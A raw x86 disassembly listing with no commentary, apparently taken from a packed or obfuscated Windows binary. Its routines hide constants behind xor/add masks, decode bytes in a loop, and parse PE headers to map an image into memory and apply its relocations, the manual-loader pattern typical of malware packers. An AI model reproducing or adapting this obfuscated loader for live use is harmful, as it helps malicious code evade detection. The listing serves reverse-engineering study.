  417621:	movzx  ecx,cl
  417624:	cmp    edx,ecx
  417626:	jne    0x417640
  417628:	mov    ecx,DWORD PTR [ebp-0x18]
  41762b:	xor    ecx,ebx
  41762d:	lea    ecx,[ecx+edi*1+0x3272e2]
  417634:	xor    ecx,ebx
  417636:	cmp    ecx,0xf89c85bd
  41763c:	jne    0x417605
  41763e:	jmp    0x417647
  417640:	mov    eax,DWORD PTR [ebp-0x14]
  417643:	xor    eax,ebx
  417645:	add    eax,esi
  417647:	mov    ecx,DWORD PTR [ebp-0x14]
  41764a:	xor    ecx,ebx
  41764c:	add    ecx,esi
  41764e:	cmp    ecx,eax
  417650:	je     0x4177c6
  417656:	mov    eax,DWORD PTR [ebp-0x10]
  417659:	mov    eax,DWORD PTR [eax+0x8]
  41765c:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  417663:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41766a:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  417671:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  417678:	mov    DWORD PTR [ebp-0x20],eax
  41767b:	mov    eax,DWORD PTR [ebp+0x8]
  41767e:	mov    ecx,DWORD PTR [ebp-0x24]
  417681:	xor    ecx,ebx
  417683:	add    ecx,esi
  417685:	push   ecx
  417686:	mov    ecx,DWORD PTR [ebp-0x48]
  417689:	mov    eax,DWORD PTR [eax+0x1d8]
  41768f:	xor    ecx,ebx
  417691:	add    ecx,esi
  417693:	push   ecx
  417694:	mov    ecx,DWORD PTR [ebp-0x40]
  417697:	xor    ecx,ebx
  417699:	add    ecx,esi
  41769b:	push   ecx
  41769c:	mov    ecx,DWORD PTR [ebp-0xc]
  41769f:	xor    ecx,ebx
  4176a1:	add    ecx,esi
  4176a3:	push   ecx
  4176a4:	call   DWORD PTR [eax+0x14]
  4176a7:	mov    edi,eax
  4176a9:	mov    eax,DWORD PTR [ebp+0x8]
  4176ac:	mov    ecx,DWORD PTR [ebp-0x24]
  4176af:	mov    eax,DWORD PTR [eax+0x1d8]
  4176b5:	xor    ecx,ebx
  4176b7:	add    ecx,esi
  4176b9:	push   ecx
  4176ba:	mov    ecx,DWORD PTR [ebp-0x48]
  4176bd:	xor    ecx,ebx
  4176bf:	add    ecx,esi
  4176c1:	push   ecx
  4176c2:	mov    ecx,DWORD PTR [ebp-0xc]
  4176c5:	push   DWORD PTR [ebp-0x20]
  4176c8:	xor    ecx,ebx
  4176ca:	add    ecx,esi
  4176cc:	push   ecx
  4176cd:	call   DWORD PTR [eax+0x14]
  4176d0:	mov    ecx,DWORD PTR [ebp-0xc]
  4176d3:	xor    ecx,ebx
  4176d5:	add    ecx,esi
  4176d7:	mov    DWORD PTR [ebp-0x24],eax
  4176da:	cmp    ecx,edi
  4176dc:	je     0x417a69
  4176e2:	mov    ecx,DWORD PTR [ebp-0xc]
  4176e5:	xor    ecx,ebx
  4176e7:	add    ecx,esi
  4176e9:	cmp    ecx,eax
  4176eb:	je     0x417a69
  4176f1:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  4176f8:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  4176ff:	mov    ecx,DWORD PTR [ebp-0x40]
  417702:	xor    cl,0x9b
  417705:	sub    cl,0x1e
  417708:	mov    BYTE PTR [edi],cl
  41770a:	mov    ecx,DWORD PTR [ebp-0xc]
  41770d:	xor    cl,0x9b
  417710:	sub    cl,0x1e
  417713:	mov    BYTE PTR [edi+0x1],cl
  417716:	mov    ecx,DWORD PTR [ebp-0x4c]
  417719:	xor    cl,0x9b
  41771c:	sub    cl,0x1e
  41771f:	mov    BYTE PTR [edi+0x2],cl
  417722:	and    DWORD PTR [ebp-0xb4],0x0
  417729:	and    DWORD PTR [ebp-0xa4],0x0
  417730:	lea    ecx,[ebp-0xa4]
  417736:	push   ecx
  417737:	push   DWORD PTR [ebp-0x20]
  41773a:	push   eax
  41773b:	lea    eax,[ebp-0xb4]
  417741:	push   eax
  417742:	mov    eax,DWORD PTR [ebp-0x10]
  417745:	push   DWORD PTR [eax+0xc]
  417748:	mov    eax,DWORD PTR [ebp-0x2c]
  41774b:	add    eax,0x10
  41774e:	push   eax
  41774f:	push   edi
  417750:	call   0x416a9a
  417755:	mov    DWORD PTR [ebp-0x40],eax
  417758:	mov    eax,DWORD PTR [ebp+0x8]
  41775b:	mov    ecx,DWORD PTR [ebp-0x50]
  41775e:	mov    eax,DWORD PTR [eax+0x1d8]
  417764:	xor    ecx,ebx
  417766:	add    ecx,esi
  417768:	push   ecx
  417769:	mov    ecx,DWORD PTR [ebp-0xc]
  41776c:	xor    ecx,ebx
  41776e:	add    ecx,esi
  417770:	push   ecx
  417771:	push   edi
  417772:	call   DWORD PTR [eax+0x18]
  417775:	mov    eax,DWORD PTR [ebp-0x40]
  417778:	add    eax,0xffcd8d1e
  41777d:	xor    eax,ebx
  41777f:	cmp    eax,0xf89c8585
  417784:	mov    eax,DWORD PTR [ebp+0x8]
  417787:	mov    eax,DWORD PTR [eax+0x1d8]
  41778d:	mov    ecx,DWORD PTR [ebp-0x50]
  417790:	jne    0x4177b3
  417792:	xor    ecx,ebx
  417794:	add    ecx,esi
  417796:	push   ecx
  417797:	mov    ecx,DWORD PTR [ebp-0xc]
  41779a:	xor    ecx,ebx
  41779c:	add    ecx,esi
  41779e:	push   ecx
  41779f:	push   DWORD PTR [ebp-0x2c]
  4177a2:	call   DWORD PTR [eax+0x18]
  4177a5:	mov    eax,DWORD PTR [ebp-0x24]
  4177a8:	mov    DWORD PTR [ebp-0x2c],eax
  4177ab:	mov    eax,DWORD PTR [ebp-0x20]
  4177ae:	mov    DWORD PTR [ebp-0x3c],eax
  4177b1:	jmp    0x4177c6
  4177b3:	xor    ecx,ebx
  4177b5:	add    ecx,esi
  4177b7:	push   ecx
  4177b8:	mov    ecx,DWORD PTR [ebp-0xc]
  4177bb:	xor    ecx,ebx
  4177bd:	add    ecx,esi
  4177bf:	push   ecx
  4177c0:	push   DWORD PTR [ebp-0x24]
  4177c3:	call   DWORD PTR [eax+0x18]
  4177c6:	mov    eax,DWORD PTR [ebp-0x3c]
  4177c9:	mov    DWORD PTR [ebp-0x38],eax
  4177cc:	mov    eax,DWORD PTR [ebp-0x2c]
  4177cf:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  4177d6:	mov    DWORD PTR [ebp-0x40],eax
  4177d9:	mov    edi,0xf89c8584
  4177de:	mov    DWORD PTR [ebp-0x30],edi
  4177e1:	mov    eax,DWORD PTR [ebp-0x28]
  4177e4:	xor    eax,ebx
  4177e6:	add    eax,esi
  4177e8:	mov    DWORD PTR [ebp-0xc],eax
  4177eb:	mov    eax,DWORD PTR [ebp-0x28]
  4177ee:	xor    eax,ebx
  4177f0:	add    eax,esi
  4177f2:	mov    DWORD PTR [ebp-0x10],eax
  4177f5:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  4177fc:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  417803:	mov    eax,DWORD PTR [ebp-0x28]
  417806:	mov    ecx,DWORD PTR [ebp-0x38]
  417809:	xor    eax,ebx
  41780b:	add    eax,esi
  41780d:	cmp    ecx,eax
  41780f:	je     0x417a05
  417815:	jmp    0x4179e1
  41781a:	mov    ecx,DWORD PTR [ebp-0xc]
  41781d:	mov    eax,DWORD PTR [ebp-0x38]
  417820:	sub    eax,ecx
  417822:	mov    ecx,DWORD PTR [ebp-0x48]
  417825:	xor    ecx,ebx
  417827:	add    ecx,esi
  417829:	xor    edx,edx
  41782b:	div    ecx
  41782d:	mov    DWORD PTR [ebp-0x10],eax
  417830:	mov    eax,DWORD PTR [ebp-0x24]
  417833:	mov    ecx,DWORD PTR [ebp-0x10]
  417836:	xor    eax,ebx
  417838:	add    eax,esi
  41783a:	cmp    ecx,eax
  41783c:	jbe    0x417848
  41783e:	mov    eax,DWORD PTR [ebp-0x24]
  417841:	xor    eax,ebx
  417843:	add    eax,esi
  417845:	mov    DWORD PTR [ebp-0x10],eax
  417848:	mov    eax,DWORD PTR [ebp-0x48]
  41784b:	mov    ecx,DWORD PTR [ebp-0x10]
  41784e:	xor    eax,ebx
  417850:	add    eax,esi
  417852:	imul   eax,ecx
  417855:	mov    DWORD PTR [ebp-0x10],eax
  417858:	mov    eax,DWORD PTR [ebp-0x28]
  41785b:	mov    ecx,DWORD PTR [ebp-0x10]
  41785e:	xor    eax,ebx
  417860:	add    eax,esi
  417862:	cmp    ecx,eax
  417864:	je     0x4179cf
  41786a:	mov    eax,DWORD PTR [ebp-0x10]
  41786d:	mov    DWORD PTR [ebp-0x20],eax
  417870:	mov    eax,DWORD PTR [ebp-0xc]
  417873:	add    eax,DWORD PTR [ebp-0x40]
  417876:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41787d:	mov    DWORD PTR [ebp-0x10],edi
  417880:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  417887:	mov    DWORD PTR [ebp-0x1c],eax
  41788a:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  417891:	mov    DWORD PTR [ebp-0x8],edi
  417894:	mov    eax,DWORD PTR [ebp-0x54]
  417897:	xor    eax,ebx
  417899:	add    eax,esi
  41789b:	jmp    0x41798e
  4178a0:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  4178aa:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  4178b4:	mov    eax,DWORD PTR [ebp-0x8]
  4178b7:	mov    ecx,DWORD PTR [ebp-0x18]
  4178ba:	xor    eax,ebx
  4178bc:	add    eax,esi
  4178be:	imul   eax,ecx
  4178c1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4178c4:	mov    al,BYTE PTR [eax+ecx*1]
  4178c7:	mov    BYTE PTR [ebp-0x1],al
  4178ca:	mov    eax,DWORD PTR [ebp-0x8]
  4178cd:	mov    ecx,DWORD PTR [ebp-0x18]
  4178d0:	xor    eax,ebx
  4178d2:	add    eax,esi
  4178d4:	imul   eax,ecx
  4178d7:	mov    ecx,DWORD PTR [ebp-0x4c]
  4178da:	xor    ecx,ebx
  4178dc:	add    eax,ecx
  4178de:	mov    ecx,DWORD PTR [ebp-0x1c]
  4178e1:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  4178e9:	mov    ecx,DWORD PTR [ebp-0xac]
  4178ef:	xor    ecx,ebx
  4178f1:	lea    eax,[ecx+eax*1+0x3272e2]
  4178f8:	movzx  ecx,BYTE PTR [ebp-0x1]
  4178fc:	xor    ecx,eax
  4178fe:	mov    BYTE PTR [ebp-0x1],cl
  417901:	mov    al,BYTE PTR [ebp-0x1]
  417904:	mov    ecx,DWORD PTR [ebp-0x8]
  417907:	mov    edx,DWORD PTR [ebp-0x18]
  41790a:	xor    ecx,ebx
  41790c:	add    ecx,esi
  41790e:	imul   ecx,edx
  417911:	mov    edx,DWORD PTR [ebp-0x1c]
  417914:	mov    BYTE PTR [ecx+edx*1],al
  417917:	mov    eax,DWORD PTR [ebp-0x8]
  41791a:	mov    ecx,DWORD PTR [ebp-0x18]
  41791d:	xor    eax,ebx
  41791f:	add    eax,esi
  417921:	imul   eax,ecx
  417924:	mov    ecx,DWORD PTR [ebp-0x1c]
  417927:	mov    al,BYTE PTR [eax+ecx*1]
  41792a:	mov    BYTE PTR [ebp-0x1],al
  41792d:	mov    eax,DWORD PTR [ebp-0x8]
  417930:	mov    ecx,DWORD PTR [ebp-0x18]
  417933:	xor    eax,ebx
  417935:	add    eax,esi
  417937:	imul   eax,ecx
  41793a:	mov    ecx,DWORD PTR [ebp-0x10]
  41793d:	xor    ecx,ebx
  41793f:	add    eax,ecx
  417941:	mov    ecx,DWORD PTR [ebp-0x1c]
  417944:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41794c:	mov    ecx,DWORD PTR [ebp-0x9c]
  417952:	xor    ecx,ebx
  417954:	lea    eax,[ecx+eax*1+0x3272e2]
  41795b:	movzx  ecx,BYTE PTR [ebp-0x1]
  41795f:	xor    ecx,eax
  417961:	mov    BYTE PTR [ebp-0x1],cl
  417964:	mov    al,BYTE PTR [ebp-0x1]
  417967:	mov    ecx,DWORD PTR [ebp-0x8]
  41796a:	mov    edx,DWORD PTR [ebp-0x18]
  41796d:	xor    ecx,ebx
  41796f:	add    ecx,esi
  417971:	imul   ecx,edx
  417974:	mov    edx,DWORD PTR [ebp-0x1c]
  417977:	mov    BYTE PTR [ecx+edx*1],al
  41797a:	mov    eax,DWORD PTR [ebp-0x34]
  41797d:	mov    ecx,DWORD PTR [ebp-0x10]
  417980:	xor    eax,ebx
  417982:	xor    ecx,ebx
  417984:	add    eax,esi
  417986:	add    ecx,esi
  417988:	imul   eax,ecx
  41798b:	add    eax,DWORD PTR [ebp-0x18]
  41798e:	mov    DWORD PTR [ebp-0x18],eax
  417991:	mov    eax,DWORD PTR [ebp-0x18]
  417994:	mov    ecx,DWORD PTR [ebp-0x20]
  417997:	cmp    ecx,eax
  417999:	jb     0x4178a0
  41799f:	mov    eax,DWORD PTR [ebp-0x10]
  4179a2:	mov    ecx,DWORD PTR [ebp-0x20]
  4179a5:	xor    eax,ebx
  4179a7:	add    eax,esi
  4179a9:	imul   eax,ecx
  4179ac:	mov    ecx,DWORD PTR [ebp-0x54]
  4179af:	xor    ecx,ebx
  4179b1:	add    ecx,esi
  4179b3:	or     eax,ecx
  4179b5:	mov    ecx,DWORD PTR [ebp-0x30]
  4179b8:	xor    ecx,ebx
  4179ba:	add    eax,ecx
  4179bc:	mov    ecx,DWORD PTR [ebp-0x30]
  4179bf:	xor    ecx,ebx
  4179c1:	add    eax,ecx
  4179c3:	mov    ecx,DWORD PTR [ebp-0xc]
  4179c6:	lea    eax,[eax+ecx*1+0x64e5c4]
  4179cd:	jmp    0x4179de
  4179cf:	mov    eax,DWORD PTR [ebp-0x30]
  4179d2:	mov    ecx,DWORD PTR [ebp-0xc]
  4179d5:	xor    eax,ebx
  4179d7:	lea    eax,[eax+ecx*1+0x3272e2]
  4179de:	mov    DWORD PTR [ebp-0xc],eax
  4179e1:	mov    eax,DWORD PTR [ebp-0x30]
  4179e4:	xor    eax,ebx
  4179e6:	mov    ecx,0xffcd8d1e
  4179eb:	sub    ecx,eax
  4179ed:	add    ecx,DWORD PTR [ebp-0x38]
  4179f0:	mov    eax,DWORD PTR [ebp-0x30]
  4179f3:	mov    edx,DWORD PTR [ebp-0xc]
  4179f6:	xor    eax,ebx
  4179f8:	add    eax,esi
  4179fa:	imul   eax,edx
  4179fd:	cmp    eax,ecx
  4179ff:	jbe    0x41781a
  417a05:	push   DWORD PTR [ebp+0x8]
  417a08:	mov    eax,DWORD PTR [ebp+0x8]
  417a0b:	push   DWORD PTR [eax+0x1cc]
  417a11:	lea    eax,[ebp-0xa0]
  417a17:	push   eax
  417a18:	mov    eax,DWORD PTR [ebp+0x8]
  417a1b:	mov    eax,DWORD PTR [eax+0x1c4]
  417a21:	push   DWORD PTR [eax]
  417a23:	mov    eax,DWORD PTR [ebp+0x8]
  417a26:	mov    eax,DWORD PTR [eax+0x1c0]
  417a2c:	push   DWORD PTR [eax]
  417a2e:	push   DWORD PTR [ebp-0x3c]
  417a31:	push   DWORD PTR [ebp-0x2c]
  417a34:	call   0x4184cb
  417a39:	mov    DWORD PTR [ebp-0x40],eax
  417a3c:	mov    eax,DWORD PTR [ebp-0x14]
  417a3f:	mov    ecx,DWORD PTR [ebp-0x2c]
  417a42:	xor    eax,ebx
  417a44:	add    eax,esi
  417a46:	cmp    eax,ecx
  417a48:	je     0x417a69
  417a4a:	mov    eax,DWORD PTR [ebp+0x8]
  417a4d:	mov    ecx,DWORD PTR [ebp-0x50]
  417a50:	mov    eax,DWORD PTR [eax+0x1d8]
  417a56:	xor    ecx,ebx
  417a58:	add    ecx,esi
  417a5a:	push   ecx
  417a5b:	mov    ecx,DWORD PTR [ebp-0x14]
  417a5e:	xor    ecx,ebx
  417a60:	add    ecx,esi
  417a62:	push   ecx
  417a63:	push   DWORD PTR [ebp-0x2c]
  417a66:	call   DWORD PTR [eax+0x18]
  417a69:	pop    edi
  417a6a:	pop    esi
  417a6b:	pop    ebx
  417a6c:	leave  
  417a6d:	ret    0x4
  417a70:	push   ebp
  417a71:	mov    ebp,esp
  417a73:	push   ecx
  417a74:	push   ecx
  417a75:	lea    eax,[ebp-0x8]
  417a78:	mov    DWORD PTR [ebp-0x4],eax
  417a7b:	push   esi
  417a7c:	mov    esi,DWORD PTR [ebp-0x4]
  417a7f:	mov    eax,0xf881ba0f
  417a84:	mov    DWORD PTR [esi],eax
  417a86:	mov    esi,DWORD PTR [ebp-0x8]
  417a89:	cmp    esi,eax
  417a8b:	pop    esi
  417a8c:	jne    0x417a96
  417a8e:	mov    BYTE PTR [ecx+0xa],0x7c
  417a92:	mov    BYTE PTR [edx+0x8],0x2f
  417a96:	mov    BYTE PTR [edx+0xa],0x7c
  417a9a:	mov    BYTE PTR [ecx+0x2],0x2
  417a9e:	leave  
  417a9f:	ret    
  417aa0:	push   ebp
  417aa1:	mov    ebp,esp
  417aa3:	push   ecx
  417aa4:	push   ecx
  417aa5:	lea    eax,[ebp-0x8]
  417aa8:	mov    DWORD PTR [ebp-0x4],eax
  417aab:	mov    edx,DWORD PTR [ebp-0x4]
  417aae:	mov    eax,0xf88b0be3
  417ab3:	mov    DWORD PTR [edx],eax
  417ab5:	mov    edx,DWORD PTR [ebp-0x8]
  417ab8:	cmp    edx,eax
  417aba:	jne    0x417acb
  417abc:	mov    eax,DWORD PTR [ebp+0x8]
  417abf:	mov    BYTE PTR [ecx+0x9],0x8
  417ac3:	mov    BYTE PTR [eax+0x7],0x47
  417ac7:	mov    BYTE PTR [ecx+0x6],0xf
  417acb:	mov    BYTE PTR [ecx+0x3],0x18
  417acf:	leave  
  417ad0:	ret    0x4
  417ad3:	push   ebp
  417ad4:	mov    ebp,esp
  417ad6:	push   ecx
  417ad7:	push   ecx
  417ad8:	lea    eax,[ebp-0x8]
  417adb:	mov    DWORD PTR [ebp-0x4],eax
  417ade:	mov    edx,DWORD PTR [ebp-0x4]
  417ae1:	mov    eax,0x7e0da0f
  417ae6:	mov    DWORD PTR [edx],eax
  417ae8:	mov    edx,DWORD PTR [ebp-0x8]
  417aeb:	cmp    edx,eax
  417aed:	jne    0x417af3
  417aef:	mov    BYTE PTR [ecx+0x7],0x47
  417af3:	mov    eax,DWORD PTR [ebp+0x8]
  417af6:	mov    BYTE PTR [ecx+0x1],0x5
  417afa:	mov    BYTE PTR [eax+0x9],0x28
  417afe:	leave  
  417aff:	ret    0x4
  417b02:	push   ebp
  417b03:	mov    ebp,esp
  417b05:	push   ecx
  417b06:	push   ecx
  417b07:	lea    eax,[ebp-0x8]
  417b0a:	mov    DWORD PTR [ebp-0x4],eax
  417b0d:	push   esi
  417b0e:	mov    esi,DWORD PTR [ebp-0x4]
  417b11:	mov    eax,0x7060e3e
  417b16:	mov    DWORD PTR [esi],eax
  417b18:	mov    esi,DWORD PTR [ebp-0x8]
  417b1b:	cmp    esi,eax
  417b1d:	pop    esi
  417b1e:	jne    0x417b2a
  417b20:	mov    BYTE PTR [edx+0x4],0x3
  417b24:	mov    WORD PTR [ecx+0x3],0x318
  417b2a:	mov    BYTE PTR [edx],0x3f
  417b2d:	leave  
  417b2e:	ret    
  417b2f:	push   ebp
  417b30:	mov    ebp,esp
  417b32:	push   ecx
  417b33:	push   ecx
  417b34:	lea    eax,[ebp-0x8]
  417b37:	mov    DWORD PTR [ebp-0x4],eax
  417b3a:	mov    edx,DWORD PTR [ebp-0x4]
  417b3d:	mov    eax,0xf8870b3f
  417b42:	mov    DWORD PTR [edx],eax
  417b44:	mov    edx,DWORD PTR [ebp-0x8]
  417b47:	cmp    edx,eax
  417b49:	jne    0x417b56
  417b4b:	mov    eax,DWORD PTR [ebp+0x8]
  417b4e:	mov    BYTE PTR [ecx+0x8],0xf
  417b52:	mov    BYTE PTR [eax+0x1],0x5
  417b56:	mov    BYTE PTR [ecx+0x5],0xb
  417b5a:	leave  
  417b5b:	ret    0x4
  417b5e:	push   esi
  417b5f:	mov    ecx,edi
  417b61:	call   0x417b2f
  417b66:	mov    edx,edi
  417b68:	mov    ecx,esi
  417b6a:	mov    BYTE PTR [esi],0x1f
  417b6d:	call   0x417b02
  417b72:	push   esi
  417b73:	mov    ecx,edi
  417b75:	mov    BYTE PTR [esi+0x5],0xb
  417b79:	call   0x417ad3
  417b7e:	push   esi
  417b7f:	mov    BYTE PTR [esi+0x6],0xf
  417b83:	call   0x417aa0
  417b88:	mov    BYTE PTR [esi+0x2],0x2
  417b8c:	mov    edx,esi
  417b8e:	jmp    0x417a70
  417b93:	push   ebp
  417b94:	mov    ebp,esp
  417b96:	push   ecx
  417b97:	mov    ecx,DWORD PTR [edx+0x194]
  417b9d:	push   esi
  417b9e:	mov    esi,DWORD PTR [ebp+0x8]
  417ba1:	mov    esi,DWORD PTR [esi]
  417ba3:	mov    DWORD PTR [ecx],esi
  417ba5:	mov    ecx,DWORD PTR [edx+0x194]
  417bab:	mov    ecx,DWORD PTR [ecx]
  417bad:	mov    esi,DWORD PTR [edx+0x190]
  417bb3:	mov    DWORD PTR [esi],ecx
  417bb5:	mov    eax,DWORD PTR [edx+0x194]
  417bbb:	mov    ecx,DWORD PTR [eax]
  417bbd:	mov    ecx,DWORD PTR [ecx+0x3c]
  417bc0:	add    ecx,DWORD PTR [eax]
  417bc2:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  417bc9:	mov    eax,DWORD PTR [ebp-0x4]
  417bcc:	movzx  ecx,WORD PTR [ecx+0x16]
  417bd0:	xor    eax,0x751089b
  417bd5:	add    eax,0x3272e2
  417bda:	pop    esi
  417bdb:	test   ecx,eax
  417bdd:	je     0x417beb
  417bdf:	mov    eax,DWORD PTR [edx+0x1c8]
  417be5:	mov    DWORD PTR [eax],0xf89c8584
  417beb:	leave  
  417bec:	ret    0x4
  417bef:	push   ebp
  417bf0:	mov    ebp,esp
  417bf2:	sub    esp,0x70
  417bf5:	and    DWORD PTR [ebp-0x20],0x0
  417bf9:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  417c00:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  417c07:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  417c0e:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  417c15:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  417c1c:	mov    eax,DWORD PTR [ebp+0x20]
  417c1f:	mov    eax,DWORD PTR [eax+0x194]
  417c25:	mov    DWORD PTR [ebp-0xc],eax
  417c28:	mov    eax,DWORD PTR [ebp+0x20]
  417c2b:	push   ebx
  417c2c:	push   esi
  417c2d:	mov    esi,DWORD PTR [eax+0x190]
  417c33:	mov    eax,DWORD PTR [ebp+0x20]
  417c36:	mov    eax,DWORD PTR [eax+0x18c]
  417c3c:	mov    DWORD PTR [ebp-0x8],eax
  417c3f:	mov    eax,DWORD PTR [eax]
  417c41:	push   edi
  417c42:	mov    DWORD PTR [ebp-0x4],esi
  417c45:	test   eax,eax
  417c47:	jne    0x417c54
  417c49:	push   DWORD PTR [ebp+0x1c]
  417c4c:	mov    edx,DWORD PTR [ebp+0x20]
  417c4f:	call   0x417b93
  417c54:	mov    eax,DWORD PTR [esi]
  417c56:	mov    ebx,DWORD PTR [esi]
  417c58:	add    ebx,DWORD PTR [eax+0x3c]
  417c5b:	mov    eax,DWORD PTR [ebp+0xc]
  417c5e:	mov    ecx,DWORD PTR [ebp-0x8]
  417c61:	mov    ecx,DWORD PTR [ecx]
  417c63:	mov    esi,0x751089b
  417c68:	xor    eax,esi
  417c6a:	mov    edi,0x3272e2
  417c6f:	add    eax,edi
  417c71:	cmp    eax,ecx
  417c73:	jne    0x417eab
  417c79:	mov    eax,DWORD PTR [ebp-0xc]
  417c7c:	mov    eax,DWORD PTR [eax]
  417c7e:	mov    DWORD PTR [ebp-0x10],eax
  417c81:	mov    eax,DWORD PTR [ebx+0x50]
  417c84:	mov    DWORD PTR [ebp-0x68],eax
  417c87:	mov    eax,DWORD PTR [ebp-0x18]
  417c8a:	xor    eax,esi
  417c8c:	add    eax,edi
  417c8e:	mov    DWORD PTR [ebp-0x64],eax
  417c91:	mov    eax,DWORD PTR [ebp-0x14]
  417c94:	and    DWORD PTR [ebp-0x6c],0x0
  417c98:	xor    eax,esi
  417c9a:	add    eax,edi
  417c9c:	mov    DWORD PTR [ebp-0x60],eax
  417c9f:	lea    eax,[ebp-0x70]
  417ca2:	push   eax
  417ca3:	mov    eax,DWORD PTR [ebp+0x8]
  417ca6:	xor    eax,esi
  417ca8:	add    eax,edi
  417caa:	push   eax
  417cab:	mov    eax,DWORD PTR [ebp+0x20]
  417cae:	add    eax,0xaa
  417cb3:	push   eax
  417cb4:	mov    eax,DWORD PTR [ebp+0x20]
  417cb7:	mov    eax,DWORD PTR [eax+0x198]
  417cbd:	mov    DWORD PTR [ebp-0x70],0x4
  417cc4:	push   DWORD PTR [eax]
  417cc6:	mov    eax,DWORD PTR [ebp+0x10]
  417cc9:	call   eax
  417ccb:	mov    ecx,DWORD PTR [ebp-0xc]
  417cce:	mov    ecx,DWORD PTR [ecx]
  417cd0:	mov    edx,DWORD PTR [ebp-0x8]
  417cd3:	mov    DWORD PTR [ebp-0x6c],eax
  417cd6:	mov    DWORD PTR [ebp+0x1c],eax
  417cd9:	mov    DWORD PTR [edx],ecx
  417cdb:	mov    ecx,DWORD PTR [ebp-0x4]
  417cde:	mov    DWORD PTR [ecx],eax
  417ce0:	mov    eax,DWORD PTR [ebx+0x50]
  417ce3:	mov    DWORD PTR [ebp-0x68],eax
  417ce6:	mov    eax,DWORD PTR [ebp-0x1c]
  417ce9:	xor    eax,esi
  417ceb:	add    eax,edi
  417ced:	mov    DWORD PTR [ebp-0x64],eax
  417cf0:	lea    eax,[ebp-0x20]
  417cf3:	mov    DWORD PTR [ebp-0x60],eax
  417cf6:	lea    eax,[ebp-0x70]
  417cf9:	push   eax
  417cfa:	mov    eax,DWORD PTR [ebp+0x8]
  417cfd:	xor    eax,esi
  417cff:	add    eax,edi
  417d01:	push   eax
  417d02:	mov    eax,DWORD PTR [ebp+0x20]
  417d05:	add    eax,0xee
  417d0a:	push   eax
  417d0b:	mov    eax,DWORD PTR [ebp+0x20]
  417d0e:	mov    eax,DWORD PTR [eax+0x198]
  417d14:	mov    DWORD PTR [ebp-0x70],0x4
  417d1b:	push   DWORD PTR [eax]
  417d1d:	mov    eax,DWORD PTR [ebp+0x10]
  417d20:	call   eax
  417d22:	test   eax,eax
  417d24:	je     0x417d49
  417d26:	and    DWORD PTR [ebp+0xc],0x0
  417d2a:	cmp    DWORD PTR [ebx+0x50],0x0
  417d2e:	jbe    0x417d49
  417d30:	mov    eax,DWORD PTR [ebp+0x1c]
  417d33:	mov    ecx,DWORD PTR [ebp-0x10]
  417d36:	sub    ecx,eax
  417d38:	mov    dl,BYTE PTR [ecx+eax*1]
  417d3b:	inc    DWORD PTR [ebp+0xc]
  417d3e:	mov    BYTE PTR [eax],dl
  417d40:	mov    edx,DWORD PTR [ebp+0xc]
  417d43:	inc    eax
  417d44:	cmp    edx,DWORD PTR [ebx+0x50]
  417d47:	jb     0x417d38
  417d49:	mov    edx,DWORD PTR [ebp+0x1c]
  417d4c:	mov    ecx,DWORD PTR [edx+0x3c]
  417d4f:	add    ecx,edx
  417d51:	mov    eax,DWORD PTR [ecx+0xa0]
  417d57:	mov    ebx,DWORD PTR [ecx+0x28]
  417d5a:	add    eax,edx
  417d5c:	sub    edx,DWORD PTR [ebp-0x10]
  417d5f:	add    ebx,DWORD PTR [ebp+0x1c]
  417d62:	mov    DWORD PTR [ebp+0xc],edx
  417d65:	mov    DWORD PTR [ebp-0x2c],ecx
  417d68:	mov    DWORD PTR [ebp-0x14],ebx
  417d6b:	mov    DWORD PTR [ebp-0x8],0x0
  417d72:	jmp    0x417dee
  417d74:	add    edx,0xfffffff8
  417d77:	shr    edx,1
  417d79:	mov    DWORD PTR [ebp-0x18],edx
  417d7c:	je     0x417dda
  417d7e:	lea    edx,[eax+0x8]
  417d81:	mov    DWORD PTR [ebp-0x4],edx
  417d84:	mov    edx,DWORD PTR [ebp-0x18]
  417d87:	mov    DWORD PTR [ebp-0x18],edx
  417d8a:	mov    edx,DWORD PTR [ebp-0x4]
  417d8d:	movzx  edx,WORD PTR [edx]
  417d90:	mov    DWORD PTR [ebp-0x24],edx
  417d93:	and    edx,0xfff
  417d99:	mov    DWORD PTR [ebp-0x28],edx
  417d9c:	mov    edx,DWORD PTR [ebp-0x24]
  417d9f:	shr    edx,0xc
  417da2:	add    edx,0xffcd8d1e
  417da8:	xor    edx,esi
  417daa:	cmp    edx,0xf89c85ba
  417db0:	jne    0x417dd1
  417db2:	mov    edx,DWORD PTR [ebp-0x28]
  417db5:	add    edx,DWORD PTR [ebp+0x1c]
  417db8:	mov    ebx,DWORD PTR [eax]
  417dba:	cmp    DWORD PTR [ebx+edx*1],0x0
  417dbe:	je     0x417dce
  417dc0:	mov    ecx,DWORD PTR [ebp+0xc]
  417dc3:	add    ecx,DWORD PTR [ebx+edx*1]
  417dc6:	mov    ebx,DWORD PTR [eax]
  417dc8:	mov    DWORD PTR [edx+ebx*1],ecx
  417dcb:	mov    ecx,DWORD PTR [ebp-0x2c]
  417dce:	mov    ebx,DWORD PTR [ebp-0x14]
  417dd1:	add    DWORD PTR [ebp-0x4],0x2
  417dd5:	dec    DWORD PTR [ebp-0x18]
  417dd8:	jne    0x417d8a
  417dda:	mov    edx,DWORD PTR [ebp-0xc]
  417ddd:	add    DWORD PTR [ebp-0x8],edx
  417de0:	mov    edx,DWORD PTR [ebp-0x8]
